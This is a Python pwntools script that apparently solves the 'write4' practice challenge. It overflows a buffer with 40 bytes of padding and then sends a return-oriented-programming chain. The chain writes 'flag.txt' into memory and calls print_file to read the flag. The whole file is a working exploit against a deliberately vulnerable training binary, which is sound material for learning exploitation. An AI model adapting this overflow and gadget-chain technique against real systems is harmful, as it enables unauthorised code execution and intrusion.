#!/usr/bin/env python
from pwn import * 
import struct
import binascii

bin_name = './write4'

context.clear(arch='amd64')
context.log_level = 'debug'

proc = process(bin_name)

write_loc   = 0x601500 
mov_r14_r15 = 0x400628 # mov qword ptr [r14], r15; ret;
pop_r14_r15 = 0x400690 # pop r14; pop r15; ret;
pop_rdi     = 0x400693 # pop rdi; ret;
print_file  = 0x400516 # print_file@plt+6

write_str   = b'flag.txt'

padding_len = 40

payload = padding_len * b'A'
for i in range(len(write_str)):
    payload += p64(pop_r14_r15)
    payload += p64(write_loc + i)
    payload += p64(write_str[i])
    payload += p64(mov_r14_r15)

payload += p64(pop_rdi)
payload += p64(write_loc)
payload += p64(print_file)

proc.recvuntil('\n> ')
proc.sendline(payload)
log.info('payload: ' + binascii.hexlify(payload).decode('ascii'))
print(proc.recvall().decode('ascii'))
